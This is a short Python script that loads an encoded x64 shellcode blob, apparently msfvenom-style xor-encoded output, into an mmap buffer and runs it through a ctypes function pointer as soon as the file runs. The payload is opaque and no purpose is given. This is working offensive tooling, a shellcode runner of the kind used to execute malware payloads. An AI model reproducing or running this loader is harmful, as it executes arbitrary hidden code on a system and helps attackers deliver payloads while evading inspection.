import ctypes
import mmap

#! https://stackoverflow.com/questions/50686320/x86-64-executing-shellcode-fails

FILE = 'shellcode_file.txt'
SHELLCODE = b'H1\xc9H\x81\xe9\xdd\xff\xff\xffH\x8d\x05\xef\xff\xff\xffH\xbb\xb6\x11iL\xc7\xa0\xf4eH1X\'H-\xf8\xff\xff\xff\xe2\xf4JY\xea\xa87H4e\xb6\x11(\x1d\x86\xf0\xa64\xe0YX\x9e\xa2\xe8\x7f7\xd6Y\xe2\x1e\xdf\xe8\x7f7\x96Y\xe2>\x97\xe8\xfb\xd2\xfc[$}\x0e\xe8\xc5\xa5\x1a-\x080\xc5\x8c\xd4$w\xd8d\r\xc6a\x16\x88\xe4P8\x04L\xf2\xd4\xee\xf4-!M\x17+t\xed\xb6\x11i\x04B`\x80\x02\xfe\x10\xb9\x1cL\xe8\xec!=QI\x05\xc6p\x173\xfe\xee\xa0\rL\x94|-\xb7\xc7$}\x0e\xe8\xc5\xa5\x1aP\xa8\x85\xca\xe1\xf5\xa4\x8e\xf1\x1c\xbd\x8b\xa3\xb8A\xbeTP\x9d\xb2x\xac!=QM\x05\xc6p\x92$=\x1d!\x08L\xe0\xe8,\xb7\xc1(\xc7\xc3(\xbcdfP1\r\x9f\xfe\xad?\xf7I(\x15\x86\xfa\xbc\xe6Z1(\x1e8@\xac$\xefK!\xc7\xd5I\xa3\x9aI\xee4\x04}\xa1\xf4e\xb6\x11iL\xc7\xe8y\xe8\xb7\x10iL\x86\x1a\xc5\xee\xd9\x96\x96\x99|PA\xc7\xe0P\xd3\xeaR\x1di\x9acY\xea\x88\xef\x9c\xf2\x19\xbc\x91\x92\xac\xb2\xa5O"\xa5c\x06&\xc7\xf9\xb5\xecl\xee\xbc/\xa6\xcc\x97K\xd3i\x0cL\xc7\xa0\xf4e'

def create_shellcode_function (shellcode_str):
    shellcode_bytes = shellcode_str
    # exec_mem = mmap.mmap(-1, len(shellcode_bytes), mmap.ACCESS_READ | mmap.ACCESS_WRITE | mmap.PROT_EXEC, flags = mmap.MAP_ANONYMOUS | mmap.SHARED)
    exec_mem = mmap.mmap(-1, len(shellcode_bytes),tagname='shellcode' , access= mmap.ACCESS_READ | mmap.ACCESS_WRITE)
    print(f'exec_mem: {exec_mem}')
	
    
    try:
        exec_mem.write(shellcode_bytes)
    except Exception as e:
        print(e)

    ctypes_buffer = ctypes.c_int.from_buffer(exec_mem)
    function = ctypes.CFUNCTYPE( ctypes.c_int64 )(ctypes.addressof(ctypes_buffer))
    function._avoid_gc_for_mmap = exec_mem
    return function

# Create a pointer to our shell code and execute it with no parameters
create_shellcode_function(SHELLCODE)()